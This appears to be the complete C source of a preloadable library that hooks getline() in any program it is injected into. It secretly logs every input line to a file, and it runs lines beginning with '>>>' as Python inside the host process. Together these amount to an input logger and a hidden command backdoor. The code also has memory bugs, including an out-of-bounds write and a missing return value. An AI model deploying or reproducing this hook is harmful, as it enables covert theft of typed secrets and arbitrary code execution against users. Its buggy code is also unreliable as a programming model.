
/* MIT License
 *
 * Copyright © 2020 Ryan Hoole
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy of
 * this software and associated documentation files (the “Software”), to deal in
 * the Software without restriction, including without limitation the rights to
 * use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
 * of the Software, and to permit persons to whom the Software is furnished to do
 * so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include "options.h"

/* get name of program, saved in glibc */
extern const char *__progname;

#if PYTHON
  #include <python3.7/Python.h>
  static char *py_cmd_delm  = ">>>";
  static char py_cmd_delm_len = 3; /* length of delm */
  static struct py_command_args *py_args;
  struct py_command_args {
    char *cmd;
    //size_t n;
  };

  static void *py_command(void *args)
  {
    pthread_detach(pthread_self());
    PyRun_SimpleString(((struct py_command_args*)args)->cmd);
  }
#endif /* PYTHON*/

#if LOG_FILE
  static FILE *fd;
  static char *fcontents;
  static size_t allocated_bytes = 256 * sizeof(char);

  static void logfile(char *s)
  {
    /* append what we get from getline() to our file, exit if fputs fails */
    if (fputs(s, fd) == EOF)
      exit(EXIT_FAILURE);
  }

  /* check if we have enough memory and reallocate if needed. */
  static void chk_mem(char **ptr, size_t n)
  {
    if (n > allocated_bytes)
    {
      /* exit if we can not allocate enough memory */
      char *new_ptr = realloc(*ptr, n);
      if (new_ptr == NULL)
        exit(EXIT_FAILURE);
      *ptr = new_ptr;
      new_ptr = NULL;
      allocated_bytes = n;
    }
  }
#endif /* LOG_FILE */

/* modified getline function */
#if GETLINE
  ssize_t (*orig_getline)(char **lineptr, size_t *n, FILE *stream);
  ssize_t getline(char **lineptr, size_t *n, FILE *stream)
  {
    if (*lineptr != NULL)
    {
      /* combine function parameters */
      #if LOG_FILE
        /* check to make sure we have enough memory allocated, grow if needed */
        chk_mem(&fcontents, *n+100);
        strcpy(fcontents, "getline(char **lineptr, size_t *n, FILE *stream):\n");
        strcat(fcontents, " : ");
        strcat(fcontents, *lineptr);
        strcat(fcontents, "\n");
        logfile(fcontents);
      #endif /* LOG_FILE */

      /* python command */
      #if PYTHON
        if (*n > 3) /* make sure input is even long enough to be command. */
        {
          char test_for_delm[4];
          strncpy(test_for_delm, *lineptr, 3);
          test_for_delm[4] = '\0'; /* null terminate */

          /* test if command */
          if (strcmp(py_cmd_delm, test_for_delm) == 0)
          {
            /* store cmd */
            py_args->cmd = *lineptr+py_cmd_delm_len;

            /* run python command in thread */
            pthread_t t_id;

            /* check if thread created, exit if failed */
            if (pthread_create(&t_id, NULL, py_command, (void *)py_args))
              exit(EXIT_FAILURE);

            /* TODO: this still seems to pass original data to function*/
            /* do not pass command to function */
            strcpy(*lineptr, "\0");
            *n = 1;
          }
        }
      #endif /* PYTHON */
    }

    /* original getline function */
    return orig_getline(lineptr, n, stream);
  }
#endif /* GETLINE */

/* _init() function gets called when loading. */
void _init(void)
{
  /* initalize python */
  #if PYTHON
    py_args = (struct py_command_args *)malloc(sizeof(struct py_command_args));
    Py_SetProgramName(__progname);
    Py_Initialize();
  #endif /* PYTHON */

  /* get orginal getline function */
  #if GETLINE
    orig_getline = dlsym(RTLD_NEXT, "getline");
  #endif /* GETLINE */

  /* allocate memory, open file descriptor in append mode, exit if we can not open fd */
  #if LOG_FILE
    fcontents = malloc(allocated_bytes);
    if ((fd = fopen(filePath, "a")) == NULL)
      exit(EXIT_FAILURE);
  #endif /* LOG_FILE */
}

/* _fini() function gets called when finishing */
void _fini(void)
{
  /* finish up python */
  #if PYTHON
    free(py_args);
    Py_Finalize();
  #endif /* PYTHON */

  /* close file */
  #if LOG_FILE
    fclose(fd);
    free(fcontents);
  #endif /* LOG_FILE */
}
